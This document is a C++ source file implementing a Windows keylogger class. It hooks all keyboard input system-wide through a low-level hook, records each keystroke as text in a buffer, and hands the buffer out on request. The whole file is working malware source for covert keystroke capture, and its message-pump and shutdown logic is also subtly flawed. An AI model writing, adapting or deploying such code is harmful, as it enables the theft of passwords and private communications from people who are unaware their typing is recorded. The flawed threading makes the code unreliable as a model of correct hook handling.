#include "keylogger.h"

Keylogger* g_instance = nullptr;

Keylogger::Keylogger() {
    g_instance = this;
}

Keylogger::~Keylogger() {
    Stop();
}

LRESULT CALLBACK Keylogger::HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN && g_instance) {
        KBDLLHOOKSTRUCT* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        std::lock_guard<std::mutex> lock(g_instance->m_mutex);

        switch (kb->vkCode) {
        case VK_RETURN:  g_instance->m_buffer += "\n"; break;
        case VK_TAB:     g_instance->m_buffer += "\t"; break;
        case VK_SPACE:   g_instance->m_buffer += " "; break;
        case VK_BACK:    g_instance->m_buffer += "[BS]"; break;
        case VK_SHIFT:   g_instance->m_buffer += "[SHIFT]"; break;
        case VK_CONTROL: g_instance->m_buffer += "[CTRL]"; break;
        case VK_ESCAPE:  g_instance->m_buffer += "[ESC]"; break;
        case VK_DELETE:  g_instance->m_buffer += "[DEL]"; break;
        default: {
            BYTE kbState[256] = {};
            GetKeyboardState(kbState);

            char c[2] = {};
            int len = ToAscii(kb->vkCode, kb->scanCode, kbState,
                reinterpret_cast<LPWORD>(c), 0);
            if (len > 0) {
                g_instance->m_buffer += std::string(c, len);
            }
            else {
                g_instance->m_buffer += "[" + std::to_string(kb->vkCode) + "]";
            }
            break;
        }
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void Keylogger::Start() {
    if (m_running) return;
    m_running = true;

    m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, GetModuleHandle(nullptr), 0);

    // Message pump required for LL hooks
    std::thread([this]() {
        MSG msg;
        while (m_running && GetMessage(&msg, nullptr, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        }).detach();
}

void Keylogger::Stop() {
    m_running = false;
    if (m_hook) {
        UnhookWindowsHookEx(m_hook);
        m_hook = nullptr;
    }
    PostThreadMessage(GetCurrentThreadId(), WM_QUIT, 0, 0);
}

std::string Keylogger::Dump() {
    std::lock_guard<std::mutex> lock(m_mutex);
    std::string out = m_buffer;
    m_buffer.clear();
    return out;
}